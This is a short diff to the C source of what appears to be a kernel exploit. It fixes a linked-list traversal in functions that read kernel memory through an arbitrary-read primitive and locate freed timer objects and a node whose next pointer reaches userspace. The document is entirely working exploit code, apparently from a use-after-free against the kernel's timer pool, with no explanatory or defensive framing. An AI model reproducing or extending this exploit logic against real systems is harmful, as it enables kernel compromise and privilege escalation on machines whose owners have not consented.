@@ -58,8 +58,9 @@ static void *find_orphan() {
     } else if (ktimer_base <= child && child < ktimer_end) {
       /* object is freed, next pointer is reachable */
       reachable[TOBJ_ADDR_TO_IDX(ktimer_base, child)] = true;
-    } else {
+    } else if (child != NULL && child != (void *)TIMER2_NEXT_KERNEL) {
       printf("[!] Warning! Timer table entry had non-vtable, non-freed entry!\n");
+      printf("It looks like this: %p -> %p\n", current_timer, child);
       wait_for_user();
     }
   }
@@ -96,7 +97,7 @@ static void **find_parent() {
   // traverse linked list until next points to userspace
   void *current_node = ktimer_pool_head;
   while (true) {
-    void *next = (void *)kreadint_real(ktimer_pool_head);
+    void *next = (void *)kreadint_real(current_node);
 
     if (next == (void *)TIMER2_NEXT_KERNEL) {
       return current_node;
